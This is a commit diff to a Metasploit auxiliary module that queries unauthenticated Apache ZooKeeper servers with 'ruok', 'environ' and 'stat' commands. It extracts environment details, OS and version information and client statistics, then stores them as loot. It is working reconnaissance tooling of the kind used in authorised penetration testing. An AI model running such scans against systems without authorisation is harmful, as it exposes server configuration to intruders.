9a148bcaf4675b5f102d4d8492689bfd5cd75054
Karn Ganeshen <KarnGaneshen@gmail.com>
2020-10-16 03:17:12 +0530

    new updates to module
    added nil response and good response case, target hostname, and os details are now captured in hosts and services db, some cosmetics, fixed date format, and timeout handling.

--- modules/auxiliary/gather/zookeeper_info_disclosure.rb
+++ modules/auxiliary/gather/zookeeper_info_disclosure.rb
@@ -10,21 +10,21 @@ class MetasploitModule < Msf::Auxiliary
 
   def initialize(info = {})
     super(update_info(info,
-      'Name' => 'Apache ZooKeeper Information Disclosure',
-      'Description' => %q{
-        Apache Zookeeper server service runs on TCP 2181 and by default, it is accessible without any authentication. This module targets Apache ZooKeeper service instances to extract information about the system environment, and application configuration.
-      },
-      'References' =>
-        [
-          ['URL', 'https://zookeeper.apache.org/doc/current/zookeeperAdmin.html']
-        ],
-      'Author' =>
-        [
-          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
-        ],
-      'DisclosureDate' => 'Oct 14, 2020',
-      'License' => MSF_LICENSE,
-      'DefaultOptions' => { 'VERBOSE' => true })
+                      'Name' => 'Apache ZooKeeper Information Disclosure',
+                      'Description' => '
+        Apache Zookeeper server service runs on TCP 2181 and by default, it is accessible without any authentication. This module targets Apache ZooKeeper service instances to extract information about the system environment, and service statistics.
+      ',
+                      'References' =>
+                        [
+                          ['URL', 'https://zookeeper.apache.org/doc/current/zookeeperAdmin.html']
+                        ],
+                      'Author' =>
+                        [
+                          'Karn Ganeshen <KarnGaneshen[at]gmail.com>'
+                        ],
+                      'DisclosureDate' => '2020-10-14',
+                      'License' => MSF_LICENSE,
+                      'DefaultOptions' => { 'VERBOSE' => true })
       )
 
     register_options(
@@ -37,41 +37,66 @@ class MetasploitModule < Msf::Auxiliary
     deregister_options('USERNAME', 'PASSWORD')
   end
 
-  def run_host(ip)
-    to = (datastore['TIMEOUT'].zero?) ? 30 : datastore['TIMEOUT']
+  def run_host(_ip)
+    to = datastore['TIMEOUT'].zero? ? 30 : datastore['TIMEOUT']
+    vprint_status("Using a timeout of #{to}...")
     begin
       ::Timeout.timeout(to) do
         connect
-        print_status('Dumping environment info...')
-        sock.put('environ')
+        print_status('Verifying if server is responding...')
+        sock.put('ruok')
         data = sock.get_once(-1, to).to_s
-        print_good("#{data}")
-        sock.close
 
-        loot_name = 'environ-log'
-        loot_type = 'text/plain'
-        loot_desc = 'Zookeeper Environment Log'
-        loot_service = 'Zookeeper'
-        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
-        print_good("File saved in: #{p} \n")
-        report_service(host: rhost, port: rport, name: 'Zookeeper', info: 'Apache Zookeeper')
+        if data && data.to_s =~ /imok/
+          print_good("Server says: #{data}. Going ahead with extraction..\n")
+          connect
+          print_status('Dumping environment info...')
+          sock.put('environ')
+          data = sock.get_once(-1, to).to_s
+          print_good(data.to_s)
+          sock.close
 
-        connect
-        print_status('Dumping statistics about performance and connected clients...')
-        sock.put('stat')
-        data = sock.get_once(-1, to).to_s
-        print_good("#{data}")
-        sock.close
+          loot_name = 'environ-log'
+          loot_type = 'text/plain'
+          loot_desc = 'Zookeeper Environment Log'
+          loot_service = 'Zookeeper'
+          p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
+          print_good("File saved in: #{p} \n")
 
-        loot_name = 'stat-log'
-        loot_type = 'text/plain'
-        loot_desc = 'Zookeeper Stat Log'
-        loot_service = 'Zookeeper'
-        p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
-        print_good("File saved in: #{p} \n")
-        report_service(host: rhost, port: rport, name: 'Zookeeper', info: 'Apache Zookeeper')
+          version = data.match(/zookeeper.version=\s*\S*/).to_s.split('=')[1].split(',')[0]
+          hname = data.match(/host.name=\s*\S*/).to_s.split('=')[1]
+          os_type = data.match(/os.name=\s*\S*/).to_s.split('=')[1]
+          os_arch = data.match(/os.arch=\s*\S*/).to_s.split('=')[1]
+          os_ver = data.match(/os.version=\s*\S*/).to_s.split('=')[1]
+          os = os_type.to_s + " " + os_arch.to_s + " " + os_ver.to_s
+
+          host_info = {
+            host: rhost,
+            os_name: os_type,
+            name: hname,
+            comments: os
+          }
+          report_host(host_info)
+          report_service(host: rhost, port: rport, name: 'Zookeeper', info: "Apache Zookeeper: #{version}")
+
+          connect
+          print_status('Dumping statistics about performance and connected clients...')
+          sock.put('stat')
+          data = sock.get_once(-1, to).to_s
+          print_good(data.to_s)
+          sock.close
+
+          loot_name = 'stat-log'
+          loot_type = 'text/plain'
+          loot_desc = 'Zookeeper Stat Log'
+          loot_service = 'Zookeeper'
+          p = store_loot(loot_name, loot_type, datastore['RHOST'], data, loot_desc, loot_service)
+          print_good("File saved in: #{p} \n")
+        else
+          print_error('No good response from server. Exiting.')
+        end
       end
-    rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
+    rescue Timeout::Error, ::Rex::TimeoutError, ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout, ::Rex::ConnectionError
       print_error("#{rhost}:#{rport} - Connection Failed...")
     ensure
       disconnect
